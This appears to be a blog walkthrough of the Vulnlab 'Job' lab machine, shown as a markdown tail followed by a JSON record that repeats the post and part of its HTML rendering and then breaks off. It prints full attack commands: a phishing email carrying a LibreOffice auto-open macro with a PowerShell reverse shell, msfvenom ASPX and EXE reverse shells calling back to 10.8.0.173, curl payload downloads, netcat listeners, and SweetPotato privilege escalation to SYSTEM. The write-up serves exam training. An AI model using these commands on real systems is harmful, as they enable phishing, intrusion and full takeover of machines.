5:57 PM             14 test.txt\n```\n\nThis website seems to also be running through Windows IIS, and a simple `hello.aspx` file is being hosted on the webserver as well.\n\n```ASPX\nPS C:\\inetpub\\wwwroot> cat hello.aspx\n<%@ Page Language=\"c#\" AutoEventWireup=\"false\" CodeBehind=\"Default.aspx.vb\" %>\n<html xmlns=\"www.w3.org/1999/xhtml\">\n<head runat=\"server\">\n        <title></title>\n</head>\n<body>\n        <form id=\"form1\" runat=\"server\">\n        <div>\n\n        <%Response. Write( \"Hello World\"); %>\n\n        </div>\n        </form>\n</body>\n</html>\n```\n\nBrowsing to this on the website, it seems that all this code is doing is printing out `Hello World` to the web page.\n\n![](/images/vulnlab/job-vl/g.png)\n\nI've dealt with IIS websites before, and I do recall that most exploits (or at least RCE) involve some form of ASPX or ASP reverse shell. Given that we have write access to the web application's home directory, I'm assuming that we can simply just generate one and potentially get a callback as the backend user.\n\nWe'll generate an ASPX reverse shell with `msfvenom`.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f aspx LHOST=10.8.0.173 LPORT=9002 > daz.aspx\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of aspx file: 3415 bytes\n```\n\nWe'll then transfer it to the local machine in the `wwwroot` directory, we can do this simply with a Python server - `python3 -m http.server 9005`.\n\n```\nPS C:\\inetpub\\wwwroot> curl http://10.8.0.173:9005/daz.aspx -O daz.aspx\nPS C:\\inetpub\\wwwroot> ls\n\nDirectory: C:\\inetpub\\wwwroot\n\nMode                 LastWriteTime         Length Name                   \n----                 -------------         ------ ----                   \nd-----        11/10/2021   8:52 PM                aspnet_client          \nd-----         11/9/2021   9:24 PM                assets                 \nd-----         11/9/2021   9:24 PM                css                    \nd-----         11/9/2021   9:24 PM                js                     \n-a----         7/14/2024   6:03 PM           3415 daz.aspx               \n-a----        11/10/2021   9:01 PM            298 hello.aspx             \n-a----         11/7/2021   1:05 PM           3261 index.html             \n-a----         7/14/2024   5:57 PM             14 test.txt\n```\n\nWe'll then set up another listener on `nc -lvnp 9002` based on our `msfvenom` payload and browse to the file on the webpage.\n\n![](/images/vulnlab/job-vl/h.png)\n\nAs you can see, our listener called back and we received a new shell as `defaultapppool`.\n\n# Exploiting SeImpersonatePrivilege\n\nUpon checking our privileges as this user, it seems that we have `SeImpersonatePrivilege` set.\n\n```\nc:\\windows\\system32\\inetsrv>whoami /priv\nwhoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeAuditPrivilege              Generate security audits                  Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n```\n\nI've exploited this privilege several times before, and the end result should be no different here. I'll give a short snippet as to how this command works with the service account that we currently have access to.\n\nService accounts, by default, will have this privilege along with SeAssignPrimaryTokenPrivilege. Having SeImpersonatePrivilege essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.\n\nWe can impersonate SYSTEM and authenticate to an evil named pipe that we create. We'll then direct this named pipe to a binary to execute, which will run in the context of SYSTEM.\n\nI ran a simple test to see if AV was enabled on this machine, and it seems that it is not.\n\n```\nPS C:\\windows\\system32\\inetsrv> \"Invoke-Mimikatz\"\n\"Invoke-Mimikatz\"\nInvoke-Mimikatz\n```\n\nIn that case, we should be able to use [SweetPotato](https://github.com/CCob/SweetPotato) to generate this authentication coercion from SYSTEM. Had Defender been enabled, I would have used the loader that I had used in Breach to execute this application in memory. You can download a precompiled version of `SweetPotato` through the GitHub repository, or compile the source code with Visual Studio.\n\nWe'll then generate a new powershell executable payload with `msfvenom`, as seen below.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9003 > daz.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of exe file: 7168 bytes\n```\n\nWe can then upload both `SweetPotato` and our `msfvenom` reverse shell to the machine using our Python server. We can then start up our netcat listener on port `9003` as seen from our payload attributes above. (`nc -lvnp 9003`)\n\n```\nPS C:\\temp> curl http://10.8.0.173:9001/SweetPotato.exe -O SweetPotato.exe\nPS C:\\temp> curl http://10.8.0.173:9001/daz.exe -O daz.exe\nPS C:\\temp> ls\n\nDirectory: C:\\temp\n\nMode                 LastWriteTime         Length Name                                                 \n----                 -------------         ------ ----                                                 \n-a----         7/14/2024   6:14 PM           7168 daz.exe                                              \n-a----         7/14/2024   6:13 PM         926208 SweetPotato.exe\n```\n\nNow that everything is set up, we'll run `SweetPotato` and point it to execute `PowerShell` on an evil-named pipe that points to our reverse shell.\n\n```\nPS C:\\temp> .\\SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a 'C:\\temp\\daz.exe' -e EfsRpc\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam\n[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/cb0eb314-002c-4c3d-9139-361e75c14e29/\\cb0eb314-002c-4c3d-9139-361e75c14e29\\cb0eb314-002c-4c3d-9139-361e75c14e29\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n```\n\nIf we look back at our third netcat listener, we'll see that a successful session was spawned as `SYSTEM`.\n\n```\n└─$ nc -lvnp 9003               \nlistening on [any] 9003 ...\nconnect to [10.8.0.173] from (UNKNOWN) [10.10.105.93] 53394\nMicrosoft Windows [Version 10.0.20348.350]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nwhoami\nnt authority\\system\n```\n\nNow that we have a shell as `SYSTEM`, we have successfully compromised this machine and can read the root flag underneath `C:\\Users\\Administrator\\Desktop\\root.txt`!\n\n# Conclusion\n\nThis box tested some knowledge of previous machines that I had done before, notably `SeImpersonatePrivilege` along with IIS exploitation through ASPX reverse shells. The LibreOffice exploitation was new, however I have set up VBA macros in the past so it was helpful to strengthen those skills.\n\nBig thanks to xct for the development of this machine.\n\n# Resources\n\nhttps://www.libreoffice.org/get-help/install-howto/\nhttps://ask.libreoffice.org/t/how-to-use-shell-from-basic-macro-solved/23590\nhttps://www.revshells.com/\nhttps://github.com/CCob/SweetPotato","source":"_posts/job.md","raw":"---\ntitle: Job - Vulnlab\ndate: 2024-07-14 14:19:34\ntags: [vulnlab, Medium]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Windows'\ndescription: Job is one of the older machines from Vulnlab that consisted of tactics generally seen on the OSCP. This is great practice for the exam, and involves LibreOffice macros in email servers along with an interesting privilege escalation path. I'll try to avoid using C2's for this machine just to stay in-line with OSCP rules.\ncover: /images/vulnlab/job-vl/job_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nJob is one of the older machines from Vulnlab that consisted of tactics generally seen on the OSCP. This is great practice for the exam, and involves LibreOffice macros in email servers along with an interesting privilege escalation path. I'll try to avoid using C2's for this machine just to stay in-line with OSCP rules.\n\n# Enumeration\n\nSo let's first start with our NMAP scan. Our entry point for this machine is `10.10.105.93`.\n\n```\n└─$ sudo nmap 10.10.105.93\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-14 12:50 EDT\nNmap scan report for 10.10.105.93\nHost is up (0.11s latency).\nNot shown: 996 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n25/tcp   open  smtp\n80/tcp   open  http\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 18.62 seconds\n```\n\nIt looks to be a Windows machine that is not a DC, so we can assume that it is a workstation. There seems to be an email service along with a website, so we can potentially look to those first for our initial foothold.\n\nJust for a service test, I also ran a test against SMB to see if null authentication was enabled.\n\n```\n└─$ smbclient -L 10.10.105.93 -N         \nsession setup failed: NT_STATUS_ACCESS_DENIED\n```\n\nIt seems that the entry point will most definitely be through either the SMTP server or through the web server. Let's take a look at the website first to see if there are any leads to exploit.\n\n![](/images/vulnlab/job-vl/b.png)\n\nThe website looks to be a job application frontpage calling for developer applications. The message from the front seems to give us a potential email for our attack path, `career@job.local`. Furthermore, the page tells us to send our CV as a LibreOffice document.\n\nThere doesn't seem to be much here aside from this page, I made sure to run a VHOST scan for other subdomains and a directory enumeration scan - though I came back with nothing.\n\nLooking at SMTP, it seems as though the server seems to have open relay enabled.\n\n```\n└─$ telnet 10.10.105.93 25\nTrying 10.10.105.93...\nConnected to 10.10.105.93.\nEscape character is '^]'.\n220 JOB ESMTP\nHELP\n211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n```\n\n# LibreOffice Macro RCE\n\nAt this point, the attack path is relatively clear. Assuming that we have nothing else to exploit on the webpage aside from the email, it seems that SMTP is the main part of the attack path. We have an email that we can send documents to, so the first part of this should be phishing.\n\nGiven what the webpage is telling us, it should only be accepting LibreOffice documents with a `.odt` extension. I'm assuming that the backend (since this is a lab) is going to immediately open our document when we send it to view its contents.\n\nThis phishing portion is an exploit directly targeted at LibreOffice - as you can essentially get RCE directly from a LibreOffice macro. Macros can be used to run shell commands directly upon opening the LibreOffice document, and are one of the (if not, the most) commonly seen vulnerability in LibreOffice.\n\nWe can set up LibreOffice Writer locally to create this macro, to which I used my Windows host to create this. LibreOffice has been difficult to set up on my Kali host in my past experiences, so I decided to opt for my Windows machine for this. You can find the installation page [here](https://www.libreoffice.org/get-help/install-howto/).\n\nOnce everything is installed and ready to go, we should be able to open our LibreOffice Writer editor.\n\n![](/images/vulnlab/job-vl/c.png)\n\nI made a short cover letter that is mostly fake, just to have some fun with this lab. I also saved this as a `.odt` file named `daz_smith_CV.odt`. \n\nThe front text doesn't really matter as to what we put on it, as the main part of this exploit consists within the `Macros` section of LibreOffice.\n\nYou can access this by going to `Tools > Macros > Organize Macros > Macros`. Select on the name of your document and click on `New`. We'll name this macro `AO` for \"AutoOpen\".\n\n![](/images/vulnlab/job-vl/d.png)\n\nThis will spawn a LibreOffice Basic editor with your macro pane on the right side of the application. The foundation for our macro is ready, all we need to do is create a Shell macro so that LibreOffice can execute commands from this macro.\n\nThis forum page details how we can set up shell macros, they are relatively simple and involve wrapping our commands inside a `Shell()` call. We'll also be looking to execute a reverse shell, to which I opted to use a Base64 encoded Powershell reverse shell crafted from [revshells.com](https://www.revshells.com/).\n\n![](/images/vulnlab/job-vl/e.png)\n\nIn order to make this macro execute upon opening the document, we'll need to set the AutoOpen feature to open this document automatically. We can access this (from the LibreOffice Writer window, not the Macro window) in `Tools > Customize`. Select `OpenDocument` from the `Events` list and select the macro that we just created.\n\nFrom here, our document should be ready to exploit. You can test that this works by reopening the document, and a PowerShell pane should be seen briefly as soon as you open it. Since we're on our Windows host and don't have a listener running, this won't do anything - though you'll know that it should be working.\n\nWith that, we'll transfer this back to our Kali system and set up a netcat listener on the port that our PowerShell reverse shell going to call back to. In my case, I'll do `nc -lvnp 9001`.\n\nWe'll now need a way to send this through SMTP, which can be trivial dependent on the tools you have access to. By default, the most up-to-date version of Kali should have the `sendemail` tool installed - which makes emails submitted through SMTP easy to submit. You could also opt to use `swaks`, though I could not seem to get that tool working on my end.\n\n```\n└─$ sendemail -s job.local -f \"daz <daz@daz.daz>\" -t career@job.local -o tls=no -m \"Please see the attached for my cover letter. \\n\\nV/R.,\\n\\nDaZ Smith\" -a daz_smith_CV.odt\n```\n\nI also made sure to set `job.local` to our IP address of `10.10.105.93` just so that it can resolve properly to the workstation. Let's send our email and wait for a result on our listener.\n\nAfter a few seconds, we should get a shell back as `jack.black`.\n\n![](/images/vulnlab/job-vl/f.png)\n\nThe user flag is within the users `Desktop` directory, meaning we have compromised the first half of this machine.\n\n# Privilege Escalation Through Writable Directories\n\nAt this point, given that we are not within an AD environment - I would assume that the next part of privilege escalation would either be credential hunting or internal application exploitation.\n\nThere doesn't seem to be much for the `jack.black` user in their home directory (nor any cached credentials in their home folder), and they do not seem to have any notable privileges on this workstation.\n\n```\nPS C:\\> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State   \n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n```\n\nI checked the `C:\\` root directory and it seems that the web server itself is being hosted within the `inetpub` page. I have confirmed that this is the website as the `index.html` page within `wwwroot` seems to be identical to the webpage we visited at the start of this machine.\n\nI did however notice that we have write access to this directory upon uploading a simple `test.txt` file.\n\n```\nPS C:\\inetpub\\wwwroot> echo \"test\" > test.txt\nPS C:\\inetpub\\wwwroot> ls\n\nDirectory: C:\\inetpub\\wwwroot\n\nMode                 LastWriteTime         Length Name                   \n----                 -------------         ------ ----                   \nd-----        11/10/2021   8:52 PM                aspnet_client          \nd-----         11/9/2021   9:24 PM                assets                 \nd-----         11/9/2021   9:24 PM                css                    \nd-----         11/9/2021   9:24 PM                js                     \n-a----        11/10/2021   9:01 PM            298 hello.aspx             \n-a----         11/7/2021   1:05 PM           3261 index.html             \n-a----         7/14/2024   5:57 PM             14 test.txt\n```\n\nThis website seems to also be running through Windows IIS, and a simple `hello.aspx` file is being hosted on the webserver as well.\n\n```ASPX\nPS C:\\inetpub\\wwwroot> cat hello.aspx\n<%@ Page Language=\"c#\" AutoEventWireup=\"false\" CodeBehind=\"Default.aspx.vb\" %>\n<html xmlns=\"www.w3.org/1999/xhtml\">\n<head runat=\"server\">\n        <title></title>\n</head>\n<body>\n        <form id=\"form1\" runat=\"server\">\n        <div>\n\n        <%Response. Write( \"Hello World\"); %>\n\n        </div>\n        </form>\n</body>\n</html>\n```\n\nBrowsing to this on the website, it seems that all this code is doing is printing out `Hello World` to the web page.\n\n![](/images/vulnlab/job-vl/g.png)\n\nI've dealt with IIS websites before, and I do recall that most exploits (or at least RCE) involve some form of ASPX or ASP reverse shell. Given that we have write access to the web application's home directory, I'm assuming that we can simply just generate one and potentially get a callback as the backend user.\n\nWe'll generate an ASPX reverse shell with `msfvenom`.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f aspx LHOST=10.8.0.173 LPORT=9002 > daz.aspx\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of aspx file: 3415 bytes\n```\n\nWe'll then transfer it to the local machine in the `wwwroot` directory, we can do this simply with a Python server - `python3 -m http.server 9005`.\n\n```\nPS C:\\inetpub\\wwwroot> curl http://10.8.0.173:9005/daz.aspx -O daz.aspx\nPS C:\\inetpub\\wwwroot> ls\n\nDirectory: C:\\inetpub\\wwwroot\n\nMode                 LastWriteTime         Length Name                   \n----                 -------------         ------ ----                   \nd-----        11/10/2021   8:52 PM                aspnet_client          \nd-----         11/9/2021   9:24 PM                assets                 \nd-----         11/9/2021   9:24 PM                css                    \nd-----         11/9/2021   9:24 PM                js                     \n-a----         7/14/2024   6:03 PM           3415 daz.aspx               \n-a----        11/10/2021   9:01 PM            298 hello.aspx             \n-a----         11/7/2021   1:05 PM           3261 index.html             \n-a----         7/14/2024   5:57 PM             14 test.txt\n```\n\nWe'll then set up another listener on `nc -lvnp 9002` based on our `msfvenom` payload and browse to the file on the webpage.\n\n![](/images/vulnlab/job-vl/h.png)\n\nAs you can see, our listener called back and we received a new shell as `defaultapppool`.\n\n# Exploiting SeImpersonatePrivilege\n\nUpon checking our privileges as this user, it seems that we have `SeImpersonatePrivilege` set.\n\n```\nc:\\windows\\system32\\inetsrv>whoami /priv\nwhoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeAuditPrivilege              Generate security audits                  Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n```\n\nI've exploited this privilege several times before, and the end result should be no different here. I'll give a short snippet as to how this command works with the service account that we currently have access to.\n\nService accounts, by default, will have this privilege along with SeAssignPrimaryTokenPrivilege. Having SeImpersonatePrivilege essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.\n\nWe can impersonate SYSTEM and authenticate to an evil named pipe that we create. We'll then direct this named pipe to a binary to execute, which will run in the context of SYSTEM.\n\nI ran a simple test to see if AV was enabled on this machine, and it seems that it is not.\n\n```\nPS C:\\windows\\system32\\inetsrv> \"Invoke-Mimikatz\"\n\"Invoke-Mimikatz\"\nInvoke-Mimikatz\n```\n\nIn that case, we should be able to use [SweetPotato](https://github.com/CCob/SweetPotato) to generate this authentication coercion from SYSTEM. Had Defender been enabled, I would have used the loader that I had used in Breach to execute this application in memory. You can download a precompiled version of `SweetPotato` through the GitHub repository, or compile the source code with Visual Studio.\n\nWe'll then generate a new powershell executable payload with `msfvenom`, as seen below.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9003 > daz.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of exe file: 7168 bytes\n```\n\nWe can then upload both `SweetPotato` and our `msfvenom` reverse shell to the machine using our Python server. We can then start up our netcat listener on port `9003` as seen from our payload attributes above. (`nc -lvnp 9003`)\n\n```\nPS C:\\temp> curl http://10.8.0.173:9001/SweetPotato.exe -O SweetPotato.exe\nPS C:\\temp> curl http://10.8.0.173:9001/daz.exe -O daz.exe\nPS C:\\temp> ls\n\nDirectory: C:\\temp\n\nMode                 LastWriteTime         Length Name                                                 \n----                 -------------         ------ ----                                                 \n-a----         7/14/2024   6:14 PM           7168 daz.exe                                              \n-a----         7/14/2024   6:13 PM         926208 SweetPotato.exe\n```\n\nNow that everything is set up, we'll run `SweetPotato` and point it to execute `PowerShell` on an evil-named pipe that points to our reverse shell.\n\n```\nPS C:\\temp> .\\SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a 'C:\\temp\\daz.exe' -e EfsRpc\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam\n[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/cb0eb314-002c-4c3d-9139-361e75c14e29/\\cb0eb314-002c-4c3d-9139-361e75c14e29\\cb0eb314-002c-4c3d-9139-361e75c14e29\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n```\n\nIf we look back at our third netcat listener, we'll see that a successful session was spawned as `SYSTEM`.\n\n```\n└─$ nc -lvnp 9003               \nlistening on [any] 9003 ...\nconnect to [10.8.0.173] from (UNKNOWN) [10.10.105.93] 53394\nMicrosoft Windows [Version 10.0.20348.350]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nwhoami\nnt authority\\system\n```\n\nNow that we have a shell as `SYSTEM`, we have successfully compromised this machine and can read the root flag underneath `C:\\Users\\Administrator\\Desktop\\root.txt`!\n\n# Conclusion\n\nThis box tested some knowledge of previous machines that I had done before, notably `SeImpersonatePrivilege` along with IIS exploitation through ASPX reverse shells. The LibreOffice exploitation was new, however I have set up VBA macros in the past so it was helpful to strengthen those skills.\n\nBig thanks to xct for the development of this machine.\n\n# Resources\n\nhttps://www.libreoffice.org/get-help/install-howto/\nhttps://ask.libreoffice.org/t/how-to-use-shell-from-basic-macro-solved/23590\nhttps://www.revshells.com/\nhttps://github.com/CCob/SweetPotato","slug":"job","published":1,"updated":"2024-07-14T18:24:01.972Z","comments":1,"layout":"post","photos":[],"_id":"clylvx4by00007xufd3mreogp","content":"<p>Job is one of the older machines from Vulnlab that consisted of tactics generally seen on the OSCP. This is great practice for the exam, and involves LibreOffice macros in email servers along with an interesting privilege escalation path. I’ll try to avoid using C2’s for this machine just to stay in-line with OSCP rules.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>So let’s first start with our NMAP scan. Our entry point for this machine is <code>10.10.105.93</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.105.93</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-14 12:50 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.105.93</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 996 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">25/tcp   open  smtp</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 18.62 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It looks to be a Windows machine that is not a DC, so we can assume that it is a workstation. There seems to be an email service along with a website, so we can potentially look to those first for our initial foothold.</p>\n<p>Just for a service test, I also ran a test against SMB to see if null authentication was enabled.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.105.93 -N         </span><br><span class=\"line\">session setup failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>\n\n<p>It seems that the entry point will most definitely be through either the SMTP server or through the web server. Let’s take a look at the website first to see if there are any leads to exploit.</p>\n<p><img src=\"/images/vulnlab/job-vl/b.png\"></p>\n<p>The website looks to be a job application frontpage calling for developer applications. The message from the front seems to give us a potential email for our attack path, <code>career@job.local</code>. Furthermore, the page tells us to send our CV as a LibreOffice document.</p>\n<p>There doesn’t seem to be much here aside from this page, I made sure to run a VHOST scan for other subdomains and a directory enumeration scan - though I came back with nothing.</p>\n<p>Looking at SMTP, it seems as though the server seems to have open relay enabled.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ telnet 10.10.105.93 25</span><br><span class=\"line\">Trying 10.10.105.93...</span><br><span class=\"line\">Connected to 10.10.105.93.</span><br><span class=\"line\">Escape character is &#x27;^]&#x27;.</span><br><span class=\"line\">220 JOB ESMTP</span><br><span class=\"line\">HELP</span><br><span class=\"line\">211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"LibreOffice-Macro-RCE\"><a href=\"#LibreOffice-Macro-RCE\" class=\"headerlink\" title=\"LibreOffice Macro RCE\"></a>LibreOffice Macro RCE</h1><p>At this point, the attack path is relatively clear. Assuming that we have nothing else to exploit on the webpage aside from the email, it seems that SMTP is the main part of the attack path. We have an email that we can send documents to, so the first part of this should be phishing.</p>\n<p>Given what the webpage is telling us, it should only be accepting LibreOffice documents with a <code>.odt</code> extension. I’m assuming that the backend (since this is a lab) is going to immediately open our document when we send it to view its contents.</p>\n<p>This phishing portion is an exploit directly targeted at LibreOffice - as you can essentially get RCE directly from a LibreOffice macro. Macros can be used to run shell commands directly upon opening the LibreOffice document, and are one of the (if not, the most) commonly seen vulnerability in LibreOffice.</p>\n<p>We can set up LibreOffice Writer locally to create this macro, to which I used my Windows host to create this. LibreOffice has been difficult to set up on my Kali host in my past experiences, so I decided to opt for my Windows machine for this. You can find the installation page <a href=\"https://www.libreoffice.org/get-help/install-howto/\">here</a>.</p>\n<p>Once everything is installed and ready to go, we should be able to open our LibreOffice Writer editor.</p>\n<p><img src=\"/images/vulnlab/job-vl/c.png\"></p>\n<p>I made a short cover letter that is mostly fake, just to have some fun with this lab. I also saved this as a <code>.odt</code> file named <code>daz_smith_CV.odt</code>. </p>\n<p>The front text doesn’t really matter as to what we put on it, as the main part of this exploit consists within the <code>Macros</code> section of LibreOffice.</p>\n<p>You can access this by going to <code>Tools &gt; Macros &gt; Organize Macros &gt; Macros</code>. Select on the name of your document and click on <code>New</code>. We’ll name this macro <code>AO</code> for “AutoOpen”.</p>\n<p><img src=\"/images/vulnlab/job-vl/d.png\"></p>\n<p>This will spawn a LibreOffice Basic editor with your macro pane on the right side of the application. The foundation for our macro is ready, all we need to do is create a Shell macro so that LibreOffice can execute commands from this macro.</p>\n<p>This forum page details how we can set up shell macros, they are relatively simple and involve wrapping our commands inside a <code>Shell()</code> call. We’ll also be looking to execute a reverse shell, to which I opted to use a Base64 encoded Powershell reverse shell crafted from <a href=\"https://www.revshells.com/\">revshells.com</a>.</p>\n<p><img src=\"/images/vulnlab/job-vl/e.png\"></p>\n<p>In order to make this macro execute upon opening the document, we’ll need to set the AutoOpen feature to open this document automatically. We can access this (from the LibreOffice Writer window, not the Macro window) in <code>Tools &gt; Customize</code>. Select <code>OpenDocument</code> from the <code>Events</code> list and select the macro that we just created.</p>\n<p>From here, our document should be ready to exploit. You can test that this works by reopening the document, and a PowerShell pane should be seen briefly as soon as you open it. Since we’re on our Windows host and don’t have a listener running, this won’t do anything - though you’ll know that it should be working.</p>\n<p>With that, we’ll transfer this back to our Kali system and set up a netcat listener on the port that our PowerShell reverse shell going to call back to. In my case, I’ll do <code>nc -lvnp 9001</code>.</p>\n<p>We’ll now need a way to send this through SMTP, which can be trivial dependent on the tools you have access to. By default, the most up-to-date version of Kali should have the <code>sendemail</code> tool installed - which makes emails submitted through SMTP easy to submit. You could also opt to use <code>swaks</code>, though I could not seem to get that tool working on my end.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sendemail -s job.local -f &quot;daz &lt;daz@daz.daz&gt;&quot; -t career@job.local -o tls=no -m &quot;Please see the attached for my cover letter. \\n\\nV/R.,\\n\\nDaZ Smith&quot; -a daz_smith_CV.odt</span><br></pre></td></tr></table></figure>\n\n<p>I also made sure to set <code>job.local</code> to our IP address of <code>10.10.105.93</code> just so that it can resolve properly to the workstation. Let’s send our email and wait for a result on our listener.</p>\n<p>After a few seconds, we should get a shell back as <code>jack.black</code>.</p>\n<p><img src=\"/images/vulnlab/job-vl/f.png\"></p>\n<p>The user flag is within the users <code>Desktop</code> directory, meaning we have compromised the first half of this machine.</p>\n<h1 id=\"Privilege-Escalation-Through-Writable-Directories\"><a href=\"#Privilege-Escalation-Through-Writable-Directories\" class=\"headerlink\" title=\"Privilege Escalation Through Writable Directories\"></a>Privilege Escalation Through Writable Directories</h1><p>At this point, given that we are not within an AD environment - I would assume that the next part of privilege escalation would either be credential hunting or internal application exploitation.</p>\n<p>There doesn’t seem to be much for the <code>jack.black</code> user in their home directory (nor any cached credentials in their home folder), and they do not seem to have any notable privileges on this workstation.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                    State   </span><br><span class=\"line\">============================= ============================== ========</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled </span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>\n\n<p>I checked the <code>C:\\</code> root directory and it seems that the web server itself is being hosted within the <code>inetpub</code> page. I have confirmed that this is the website as the <code>index.html</code> page within <code>wwwroot</code> seems to be identical to the webpage we visited at the start of this machine.</p>\n<p>I did however notice that we have write access to this directory upon uploading a simple <code>test.txt</code> file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\inetpub\\wwwroot&gt; echo &quot;test&quot; &gt; test.txt</span><br><span class=\"line\">PS C:\\inetpub\\wwwroot&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\inetpub\\wwwroot</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name                   </span><br><span class=\"line\">----                 -------------         ------ ----                   </span><br><span class=\"line\">d-----        11/10/2021   8:52 PM                aspnet_client          </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                assets                 </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                css                    </span><br><span class=\"line\">d-----         11/9/2021   9:24 PM                js                     </span><br><span class=\"line\">-a----        11/10/2021   9:01 PM            298 hello.aspx             </span><br><span class=\"line\">-a----         11/7/2021   1:05 PM           3261 index.html             </span><br><span class=\"line\">-a----         